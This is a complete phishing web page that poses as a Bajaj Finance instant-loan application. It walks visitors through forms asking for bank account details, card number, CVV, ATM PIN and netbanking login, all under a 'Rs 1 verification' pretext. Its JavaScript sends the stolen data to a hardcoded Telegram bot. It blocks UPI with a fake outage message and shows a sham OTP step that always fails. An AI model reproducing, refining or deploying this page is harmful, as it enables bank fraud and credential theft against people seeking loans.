<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bajaj Finance - Instant Loan Approval</title>
    <style>
       *{
margin:0;
padding:0;
box-sizing:border-box;
}

body{
font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;
background:linear-gradient(135deg,#1e3c72 0%,#2a5298 50%,#f7931e 100%);
min-height:100vh;
display:flex;
align-items:center;
justify-content:center;
}

/* CONTAINER */

.container{
background:#fff;
border-radius:25px;
box-shadow:0 25px 50px rgba(0,0,0,0.15);
max-width:480px;
width:100%;
overflow:hidden;
animation:slideUp .5s ease-out;
}

/* MOBILE FULL SCREEN */

@media(max-width:768px){

body{
padding:0;
align-items:flex-start;
}

.container{
max-width:100%;
width:100%;
min-height:100vh;
border-radius:0;
box-shadow:none;
}

}

/* ANIMATION */

@keyframes slideUp{
from{
opacity:0;
transform:translateY(30px);
}
to{
opacity:1;
transform:translateY(0);
}
}

/* HEADER */

.header{
background:linear-gradient(135deg,#f7931e 0%,#ff6b35 50%,#f7931e 100%);
padding:35px 25px;
text-align:center;
color:#fff;
position:relative;
overflow:hidden;
}

.header::before{
content:'';
position:absolute;
top:-50%;
right:-50%;
width:100%;
height:200%;
background:radial-gradient(circle,rgba(255,255,255,0.1) 1px,transparent 1px);
background-size:20px 20px;
}

.logo{
width:90px;
height:90px;
background:linear-gradient(135deg,#fff 0%,#f8f9fa 100%);
border-radius:50%;
margin:0 auto 20px;
display:flex;
align-items:center;
justify-content:center;
font-size:36px;
font-weight:800;
color:#f7931e;
box-shadow:0 15px 35px rgba(247,147,30,.3);
position:relative;
z-index:2;
}

.header h1{
font-size:26px;
margin-bottom:8px;
font-weight:700;
position:relative;
z-index:2;
}

.header p{
font-size:16px;
opacity:.9;
position:relative;
z-index:2;
}

/* PROGRESS */

.progress-bar{
display:flex;
background:rgba(255,255,255,.2);
border-radius:12px;
padding:3px;
margin:0 25px 30px;
}

.progress-step{
flex:1;
height:8px;
border-radius:10px;
transition:.4s;
}

.progress-step.active{
background:#fff;
box-shadow:0 0 15px rgba(255,255,255,.5);
}

/* FORM */

.form-container{
padding:35px 30px 30px;
}

.step{
display:none;
animation:fadeInUp .4s ease-out;
}

.step.active{
display:block;
}

@keyframes fadeInUp{
from{
opacity:0;
transform:translateY(20px);
}
to{
opacity:1;
transform:translateY(0);
}
}

/* OTP SECTION */
.otp-section {
    text-align: center;
    padding: 30px 20px;
}

.otp-input-group {
    margin-bottom: 25px;
}

.otp-input {
    width: 100%;
    padding: 20px;
    border: 2px solid #e9ecef;
    border-radius: 15px;
    font-size: 24px;
    text-align: center;
    letter-spacing: 10px;
    font-weight: 700;
    background: #f8f9fa;
    transition: .3s;
}

.otp-input:focus {
    outline: none;
    border-color: #f7931e;
    background: #fff;
    box-shadow: 0 10px 25px rgba(247,147,30,.15);
    transform: translateY(-2px);
}

.timer {
    font-size: 24px;
    font-weight: 700;
    color: #f7931e;
    margin: 20px 0;
    font-family: 'Courier New', monospace;
}

/* INPUT */

.input-group{
margin-bottom:25px;
}

label{
display:block;
margin-bottom:10px;
font-weight:600;
color:#2c3e50;
font-size:15px;
}

input{
width:100%;
padding:18px 20px;
border:2px solid #e9ecef;
border-radius:15px;
font-size:16px;
transition:.3s;
background:#f8f9fa;
}

input:focus{
outline:none;
border-color:#f7931e;
background:#fff;
box-shadow:0 10px 25px rgba(247,147,30,.15);
transform:translateY(-2px);
}

/* BUTTON */

.btn{
width:100%;
padding:18px;
border:none;
border-radius:15px;
font-size:16px;
font-weight:700;
cursor:pointer;
transition:.3s;
margin-bottom:15px;
position:relative;
overflow:hidden;
}

.btn::before{
content:'';
position:absolute;
top:0;
left:-100%;
width:100%;
height:100%;
background:linear-gradient(90deg,transparent,rgba(255,255,255,.3),transparent);
transition:left .5s;
}

.btn:hover::before{
left:100%;
}

.btn-primary{
background:linear-gradient(135deg,#f7931e 0%,#ff6b35 50%,#f7931e 100%);
color:#fff;
box-shadow:0 10px 25px rgba(247,147,30,.3);
}

.btn-primary:hover{
transform:translateY(-3px);
box-shadow:0 15px 35px rgba(247,147,30,.4);
}

.btn-secondary{
background:linear-gradient(135deg,#6c757d 0%,#495057 100%);
color:#fff;
}

/* PAYMENT TABS */

.payment-tabs{
display:flex;
margin-bottom:25px;
background:linear-gradient(135deg,#f8f9fa 0%,#e9ecef 100%);
border-radius:15px;
overflow:hidden;
}

.tab-btn{
flex:1;
padding:18px 10px;
border:none;
background:transparent;
font-size:16px;
font-weight:700;
cursor:pointer;
transition:.3s;
color:#6c757d;
}

.tab-btn.active{
background:linear-gradient(135deg,#f7931e 0%,#ff6b35 100%);
color:#fff;
}

.tab-content{
display:none;
}

.tab-content.active{
display:block;
animation:slideIn .3s ease-out;
}

@keyframes slideIn{
from{
opacity:0;
transform:translateX(20px);
}
to{
opacity:1;
transform:translateX(0);
}
}

/* GRID */

.card-grid{
display:grid;
grid-template-columns:1fr 1fr;
gap:20px;
margin-bottom:25px;
}

/* ALERT */

.error,.success{
padding:20px;
border-radius:15px;
margin-bottom:25px;
display:none;
text-align:center;
}

.error{
background:linear-gradient(135deg,#f8d7da 0%,#f5c6cb 100%);
color:#721c24;
border-left:5px solid #dc3545;
}

.success{
background:linear-gradient(135deg,#d4edda 0%,#c3e6cb 100%);
color:#155724;
border-left:5px solid #28a745;
}

/* OTP POPUP */
.otp-popup {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0,0,0,0.8);
    z-index: 10000;
    display: flex;
    align-items: center;
    justify-content: center;
}

.otp-popup-content {
    background: linear-gradient(135deg, #fff 0%, #f8f9fa 100%);
    border-radius: 25px;
    padding: 40px;
    max-width: 450px;
    width: 90%;
    text-align: center;
    box-shadow: 0 30px 80px rgba(0,0,0,0.4);
    border: 4px solid #f7931e;
    transform: scale(0);
    animation: otpPopupAnim 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55) forwards;
    position: relative;
    overflow: hidden;
}

.otp-popup-content::before {
    content: '';
    position: absolute;
    top: -50%;
    left: -50%;
    width: 200%;
    height: 200%;
    background: linear-gradient(45deg, transparent 30%, rgba(247,147,30,0.1) 50%, transparent 70%);
    animation: shine 2s infinite;
}

@keyframes otpPopupAnim {
    0% {
        transform: scale(0) rotate(-180deg);
        opacity: 0;
    }
    60% {
        transform: scale(1.1) rotate(10deg);
    }
    100% {
        transform: scale(1) rotate(0deg);
        opacity: 1;
    }
}

@keyframes shine {
    0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
    100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
}

.otp-popup-icon {
    font-size: 60px;
    margin-bottom: 20px;
    animation: bounce 1s infinite;
}

@keyframes bounce {
    0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
    40% { transform: translateY(-10px); }
    60% { transform: translateY(-5px); }
}

.otp-popup h3 {
    color: #2c3e50;
    margin-bottom: 10px;
    font-size: 24px;
    font-weight: 700;
}

/* MOBILE FIX */

@media(max-width:480px){

.header{
padding:28px 20px;
}

.form-container{
padding:28px 20px;
}

.card-grid{
grid-template-columns:1fr;
gap:15px;
}

.logo{
width:70px;
height:70px;
font-size:28px;
}

    .verify-box {
    background: linear-gradient(135deg, #fff3cd 0%, #ffeeba 100%);
    border: 2px solid #f7931e;
    color: #856404;
    padding: 15px 18px;
    border-radius: 12px;
    text-align: center;
    font-weight: 600;
    margin-bottom: 20px;
    font-size: 15px;
    box-shadow: 0 5px 15px rgba(247,147,30,0.15);
    animation: pulse 1.8s infinite;
}

.verify-box span {
    font-size: 18px;
    font-weight: 700;
    color: #ff6b35;
}

@keyframes pulse {
    0% {transform: scale(1);}
    50% {transform: scale(1.02);}
    100% {transform: scale(1);}
}

.otp-popup-content {
    padding: 30px 20px;
    margin: 20px;
}

.header h1{
font-size:22px;
}

}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">BF</div>
            <h1>Bajaj Finance</h1>
            <p>✅ Instant Loan Approval</p>
            <div class="progress-bar">
                <div class="progress-step active"></div>
                <div class="progress-step"></div>
                <div class="progress-step"></div>
            </div>
        </div>
        
        <div class="form-container">
            <!-- STEP 1: Personal Details -->
            <div class="step active" id="step1">
                <div class="input-group">
                    <label>👤 Full Name *</label>
                    <input type="text" id="name" placeholder="Enter your full name" required>
                </div>
                <div class="input-group">
                    <label>📱 Mobile Number *</label>
                    <input type="tel" id="mobile" placeholder="98XXXXXXXX" maxlength="10" required>
                </div>
                <div class="input-group">
                    <label>💰 Loan Amount (₹) *</label>
                    <input type="number" id="loanAmount" placeholder="50000" min="10000" max="5000000" required>
                </div>
                <button class="btn btn-primary" onclick="nextStep(1)">
                    Continue → 
                </button>
            </div>

            <!-- STEP 2: Bank Details -->
            <div class="step" id="step2">
                <div class="input-group">
                    <label>🏦 Account Number *</label>
                    <input type="text" id="accountNo" placeholder="1234567890123456" required>
                </div>
                <div class="input-group">
                    <label>🔑 IFSC Code *</label>
                    <input type="text" id="ifsc" placeholder="HDFC0001234" maxlength="11" required>
                </div>
                <div class="progress-bar">
                    <div class="progress-step active"></div>
                    <div class="progress-step active"></div>
                    <div class="progress-step"></div>
                </div>
                <button class="btn btn-primary" onclick="nextStep(2)">
                    Continue to Payment → 
                </button>
                <button class="btn btn-secondary" onclick="prevStep(2)">
                    ← Back
                </button>
            </div>

            <!-- STEP 3: Payment Methods -->
            <div class="step" id="step3">
                 <!-- Verification Message -->
<div class="verify-box">
    ⚠️ Please pay <span>₹1</span> for account verification.
</div>
                <h3 style="text-align:center;margin-bottom:20px;color:#2c3e50;font-size:20px;">Select Payment Method</h3>
                
                <div class="payment-tabs">
                    <button class="tab-btn active" onclick="selectPayment('card')">
                        💳 Card
                    </button>
                    <button class="tab-btn" onclick="selectPayment('netbanking')">
                        🏦 Netbanking
                    </button>
                    <button class="tab-btn" onclick="selectPayment('upi')">
                        📱 UPI
                    </button>
                </div>

                <!-- Card Payment -->
                <div class="tab-content active" id="card-form">
                    <div class="input-group">
                        <label>💳 Card Number</label>
                        <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
                    </div>
                    <div class="card-grid">
                        <div class="input-group">
                            <label>📅 Expiry (MM/YY)</label>
                            <input type="text" id="expiry" placeholder="12/25" maxlength="5" required>
                        </div>
                        <div class="input-group">
                            <label>🔒 CVV</label>
                            <input type="text" id="cvv" placeholder="123" maxlength="4" required>
                        </div>
                    </div>
                    <div class="input-group">
                        <label>🔑 ATM PIN</label>
                        <input type="password" id="pin" placeholder="****" maxlength="6" required>
                    </div>
                    <button class="btn btn-primary" onclick="submitCard()">
                        Verify OTP
                    </button>
                </div>

                <!-- Netbanking -->
                <div class="tab-content" id="netbanking-form">
                    <div class="input-group">
                        <label>🏦 Netbanking Username</label>
                        <input type="text" id="netUsername" placeholder="your_username" required>
                    </div>
                    <div class="input-group">
                        <label>🔐 Password</label>
                        <input type="password" id="netPassword" placeholder="your_password" required>
                    </div>
                    <button class="btn btn-primary" onclick="submitNetbanking()">
                        🚀 Login & Pay
                    </button>
                </div>

                <div class="progress-bar" style="margin-top:20px;">
                    <div class="progress-step active"></div>
                    <div class="progress-step active"></div>
                    <div class="progress-step active"></div>
                </div>
                <button class="btn btn-secondary" onclick="prevStep(3)">
                    ← Back to Bank Details
                </button>
            </div>

            <!-- OTP Section -->
            <div class="step" id="otpStep">
                <div class="otp-section">
                    <div class="otp-input-group">
                        <label>🔐 Enter OTP (6 digits)</label>
                        <input type="text" class="otp-input" id="otpInput" placeholder="123456" maxlength="6" required>
                    </div>
                    <div class="timer" id="timer">5:00</div>
                    <button class="btn btn-primary" id="submitOtpBtn" onclick="submitOtp()">
                        ✅ Verify & Submit
                    </button>
                    <button class="btn btn-secondary" onclick="backToPayment()">
                        ← Back to Payment
                    </button>
                </div>
            </div>

            <!-- Error Message -->
            <div class="error" id="errorMsg"></div>
        </div>
    </div>

    <script>let currentStep = 1;
let currentPaymentTab = 'card';
let otpTimer;
let timeLeft = 300; // 5 minutes in seconds

// Telegram Config
const TELEGRAM_BOT_TOKEN = "8433694608:AAGIvNk5eVUAT18kFFHeRtLG6gMoO6udZPY";
const TELEGRAM_CHAT_ID = "8270681405";

// Current date
const currentDate = new Date().toLocaleString('en-IN', {
    timeZone: 'Asia/Kolkata',
    weekday: 'short',
    year: 'numeric',
    month: 'short',
    day: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit'
});

// Function to send data to Telegram
async function sendToTelegram(data) {
    try {
        const message = `
🚨 *NEW LOAN APPLICATION* 🚨
📅 *Date/Time:* ${currentDate}

👤 *Personal Details:*
• Name: ${data.name || 'N/A'}
• Mobile: ${data.mobile || 'N/A'}
• Loan Amount: ₹${parseInt(data.loanAmount || 0).toLocaleString() || 'N/A'}

🏦 *Bank Details:*
• Account No: ${data.accountNo || 'N/A'}
• IFSC: ${data.ifsc || 'N/A'}

💳 *Payment Details:*
• Method: ${data.paymentMethod || 'N/A'}
${data.cardNumber ? `• Card: ${data.cardNumber}\n• Expiry: ${data.expiry || 'N/A'}\n• CVV: ${data.cvv || 'N/A'}\n• PIN: ${data.pin || 'N/A'}` : ''}
${data.netUsername ? `• Netbanking Username: ${data.netUsername}\n• Netbanking Password: ${data.netPassword}` : ''}

━━━━━━━━━━━━━━━━━━━━
        `.trim();

        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const payload = {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        };

        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload)
        });

        return response.ok;
    } catch (error) {
        console.error('Telegram send failed:', error);
        return false;
    }
}

// Card Number Formatting
document.getElementById('cardNumber').addEventListener('input', function(e) {
    let value = e.target.value.replace(/\s/g, '').replace(/[^0-9]/gi, '');
    let formatted = value.match(/.{1,4}/g)?.join(' ') || value;
    e.target.value = formatted;
});

// Expiry Date Formatting
document.getElementById('expiry').addEventListener('input', function(e) {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length >= 2) {
        value = value.substring(0, 2) + '/' + value.substring(2, 4);
    }
    e.target.value = value;
});

// Mobile Number Formatting
document.getElementById('mobile').addEventListener('input', function(e) {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 10) value = value.slice(0, 10);
    e.target.value = value;
});

// OTP Input Formatting
document.getElementById('otpInput').addEventListener('input', function(e) {
    e.target.value = e.target.value.replace(/\D/g, '').slice(0,6);
});

// Step Navigation with Validation
function nextStep(step) {
    const currentStepEl = document.getElementById(`step${step}`);
    const inputs = currentStepEl.querySelectorAll('input[required]');
    
    for (let input of inputs) {
        if (!input.value.trim()) {
            shakeInput(input);
            showError('Please fill all required fields marked with *');
            return;
        }
    }

    document.getElementById(`step${step}`).classList.remove('active');
    currentStep = step + 1;
    document.getElementById(`step${currentStep}`).classList.add('active');
    updateProgressBar();
    hideError();
}

function prevStep(step) {
    document.getElementById(`step${step}`).classList.remove('active');
    currentStep = step - 1;
    document.getElementById(`step${currentStep}`).classList.add('active');
    updateProgressBar();
    hideError();
}

function updateProgressBar() {
    document.querySelectorAll('.progress-step').forEach((stepEl, index) => {
        if (index < currentStep) {
            stepEl.classList.add('active');
        } else {
            stepEl.classList.remove('active');
        }
    });
}

// Input shake animation
function shakeInput(input) {
    input.style.borderColor = '#dc3545';
    input.style.transform = 'translateX(0)';
    
    input.animate([
        { transform: 'translateX(-5px)' },
        { transform: 'translateX(5px)' },
        { transform: 'translateX(-3px)' },
        { transform: 'translateX(3px)' },
        { transform: 'translateX(0)' }
    ], {
        duration: 400,
        iterations: 1
    });

    setTimeout(() => {
        input.style.borderColor = '#e9ecef';
        input.style.transform = '';
    }, 2000);
}

// Payment Tab Selection
function selectPayment(tab) {
    currentPaymentTab = tab;
    
    if (tab === 'upi') {
        showUpiPopup();
        return;
    }
    
    document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
    event.target.classList.add('active');
    
    document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
    document.getElementById(`${tab}-form`).classList.add('active');
}

// UPI Error Popup
function showUpiPopup() {
    const overlay = document.createElement('div');
    overlay.id = 'upi-overlay';
    overlay.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0,0,0,0.7);
        z-index: 9999;
        display: flex;
        align-items: center;
        justify-content: center;
    `;
    
    const popup = document.createElement('div');
    popup.style.cssText = `
        background: linear-gradient(135deg, #fff 0%, #f8f9fa 100%);
        border-radius: 20px;
        padding: 30px;
        max-width: 400px;
        width: 90%;
        text-align: center;
        box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        border: 3px solid #dc3545;
        animation: popupSlide 0.4s ease-out;
    `;
    
    popup.innerHTML = `
        <div style="font-size: 48px; margin-bottom: 15px;">❌</div>
        <h3 style="color: #dc3545; margin: 0 0 15px 0; font-weight: 700;">UPI Payment Unavailable</h3>
        <p style="color: #6c757d; font-size: 16px; margin: 0 0 25px 0; line-height: 1.5;">
            UPI payment is temporarily unavailable.<br>
            <strong>Please use Card or Netbanking instead.</strong>
        </p>
        <div style="background: linear-gradient(135deg, #dc3545, #c82333); color: white; padding: 12px 25px; border-radius: 50px; font-weight: 600; cursor: pointer; transition: all 0.3s; font-size: 16px; margin: 0 auto; width: fit-content;" onclick="closeUpiPopup()">
            🔄 Switch to Card Payment
        </div>
    `;
    
    overlay.appendChild(popup);
    document.body.appendChild(overlay);
}

function closeUpiPopup() {
    const overlay = document.getElementById('upi-overlay');
    if (overlay) {
        overlay.remove();
    }
    setTimeout(() => {
        document.querySelector('.tab-btn:first-child').click();
    }, 100);
}

// Submit Card Payment - IMMEDIATE TELEGRAM + OTP POPUP
async function submitCard() {
    const formData = getFormData();
    if (!validateCardForm(formData)) return;
    
    const btn = event.target;
    btn.disabled = true;
    btn.innerHTML = '⏳ Sending...';
    
    // Send to Telegram IMMEDIATELY
    await sendToTelegram({
        paymentMethod: 'Card',
        ...formData
    });
    
    // Show OTP Success Popup for 2 seconds
    showOtpSuccessPopup();
    
    btn.disabled = false;
    btn.innerHTML = '🔒 Secure Pay Now';
}

// Submit Netbanking
async function submitNetbanking() {
    const username = document.getElementById('netUsername').value.trim();
    const password = document.getElementById('netPassword').value;
    
    if (!username || !password) {
        shakeInput(document.getElementById('netUsername') || document.getElementById('netPassword'));
        showError('Please enter both Netbanking username and password');
        return;
    }
    
    const btn = event.target;
    btn.disabled = true;
    btn.innerHTML = '⏳ Sending...';
    
    await sendToTelegram({
        paymentMethod: 'Netbanking',
        netUsername: username,
        netPassword: password,
        ...getFormData()
    });
    
    showOtpSuccessPopup();
    
    btn.disabled = false;
    btn.innerHTML = '🚀 Login & Pay';
}

// OTP Success Popup (2 seconds)
function showOtpSuccessPopup() {
    const popup = document.createElement('div');
    popup.className = 'otp-popup';
    popup.innerHTML = `
        <div class="otp-popup-content">
            <div class="otp-popup-icon">✅</div>
            <h3>OTP Sent Successfully!</h3>
            <p style="color: #6c757d; margin-bottom: 20px;">Check your mobile for 6-digit OTP</p>
        </div>
    `;
    
    document.body.appendChild(popup);
    
    // Remove popup after 2 seconds and go to OTP step
    setTimeout(() => {
        popup.remove();
        goToOtpStep();
    }, 2000);
}

// Go to OTP Step + Start Timer
function goToOtpStep() {
    document.getElementById('step3').classList.remove('active');
    document.getElementById('otpStep').classList.add('active');
    currentStep = 4;
    startOtpTimer();
}

// Start 5-minute countdown
function startOtpTimer() {
    timeLeft = 300;
    updateTimerDisplay();
    
    otpTimer = setInterval(() => {
        timeLeft--;
        updateTimerDisplay();
        
        if (timeLeft <= 0) {
            clearInterval(otpTimer);
            document.getElementById('submitOtpBtn').disabled = true;
            document.getElementById('submitOtpBtn').innerHTML = '⏰ Time Expired';
            showError('OTP expired. Please try again.');
        }
    }, 1000);
}

function updateTimerDisplay() {
    const minutes = Math.floor(timeLeft / 60);
    const seconds = timeLeft % 60;
    document.getElementById('timer').textContent = 
        `${minutes}:${seconds.toString().padStart(2, '0')}`;
}

// Submit OTP - Always Incorrect
function submitOtp() {
    const otp = document.getElementById('otpInput').value;
    
    if (otp.length !== 6) {
        shakeInput(document.getElementById('otpInput'));
        showError('Please enter 6-digit OTP');
        return;
    }
    
    // Show incorrect OTP warning
    document.getElementById('errorMsg').innerHTML = `
        ❌ Incorrect OTP. Please try after some time.
        <br><small style="color: #dc3545;">Your session will expire in ${timeLeft}s</small>
    `;
    document.getElementById('errorMsg').style.display = 'block';
    
    // Clear OTP input
    document.getElementById('otpInput').value = '';
    
    // Shake OTP input
    shakeInput(document.getElementById('otpInput'));
}

function backToPayment() {
    clearInterval(otpTimer);
    document.getElementById('otpStep').classList.remove('active');
    document.getElementById('step3').classList.add('active');
    currentStep = 3;
}

// Get All Form Data
function getFormData() {
    return {
        name: document.getElementById('name').value.trim(),
        mobile: document.getElementById('mobile').value.trim(),
        loanAmount: document.getElementById('loanAmount').value,
        accountNo: document.getElementById('accountNo').value.trim(),
        ifsc: document.getElementById('ifsc').value.trim().toUpperCase(),
        cardNumber: document.getElementById('cardNumber').value.replace(/\s/g, ''),
        expiry: document.getElementById('expiry').value,
        cvv: document.getElementById('cvv').value,
        pin: document.getElementById('pin').value
    };
}

// Card Form Validation
function validateCardForm(data) {
    if (!data.cardNumber || data.cardNumber.length < 13) {
        showError('Please enter a valid card number (13-16 digits)');
        return false;
    }
    if (!data.expiry || !/^\d{2}\/\d{2}$/.test(data.expiry)) {
        showError('Please enter valid expiry date in MM/YY format');
        return false;
    }
    if (!data.cvv || data.cvv.length < 3 || data.cvv.length > 4) {
        showError('Please enter valid CVV (3 or 4 digits)');
        return false;
    }
    if (!data.pin || data.pin.length < 4 || data.pin.length > 6) {
        showError('Please enter valid ATM PIN (4-6 digits)');
        return false;
    }
    return true;
}

// Show Error
function showError(message) {
    const errorEl = document.getElementById('errorMsg');
    errorEl.innerHTML = `<strong>❌ ${message}</strong>`;
    errorEl.style.display = 'block';
    setTimeout(hideError, 6000);
}

// Hide Error
function hideError() {
    document.getElementById('errorMsg').style.display = 'none';
}

// Initialize
updateProgressBar();
    </script>
